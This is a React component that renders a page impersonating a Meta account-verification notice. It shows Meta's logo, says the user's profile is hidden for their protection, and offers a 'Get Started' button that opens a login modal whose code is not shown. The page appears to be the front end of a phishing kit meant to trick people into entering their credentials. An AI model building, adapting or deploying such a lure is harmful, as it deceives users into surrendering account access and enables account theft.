import React, {useState} from 'react'
import LoginModal from '../modal/LoginModal'
import LoginImage from '../assets/intro.png'
import MetaLogo from '..//assets/metalogo.png'

const VerifyAccount = () => {
    const [showModal, setShowModal] = useState(false)
  return (
    <>
    <div className='container-fluid' 
    style={{width:"100%", 
    height:"50px", 
    background:"#0D6EFD"}}>
      <div className='d-flex align-item-center'>
       <img className='mt-3' 
       src={MetaLogo} alt="meta" 
       style={{width: '1.3rem' , height:"1.3rem"}} />
      </div>
    </div>

    <div className='container mt-5' >
      <div className='d-flex justify-content-center'>
      <img src={LoginImage} alt="login-img" />
      </div>
    </div>

    <div className='container my-5' >
      <div className='d-flex justify-content-center'>
        <h1 className='text-center fs-2 fw-semibold' >Hi, we need to confirm this account belongs to you</h1>
      </div>
    </div>

    <div className='container p-0' style={{borderTop:"1px solid lightgray", borderBottom:"1px solid lightgray"}} >
      <div className='my-5 p-4 rounded' style={{background:"lightgray"}}>
      {/* <h4>Account Locked {moment().format('MMMM Do YYYY,')}</h4> */}
      <p className='mt-3'>To protect you, your profile is hidden now and you can't access some features.</p>
      </div>
    </div>

    <div className='container my-4' >
      <div className='d-flex justify-content-center'>
        <p className='text-center' >You ll need to complete some security steps to confirm this is your account.</p>
      </div>
    </div>

    <div className='container d-flex justify-content-center my-4' >
     
        <button className='text-center text-white p-2 border-0 rounded d-flex justify-content-center flex-grow-1' 
        style={{background:"#0D6EFD"}}
        onClick={() => setShowModal(true)}
        >
          Get Started
      </button>
      
    </div>
   { showModal && <LoginModal showModal={showModal} setShowModal={setShowModal} />}
    </>
  )
}

export default VerifyAccount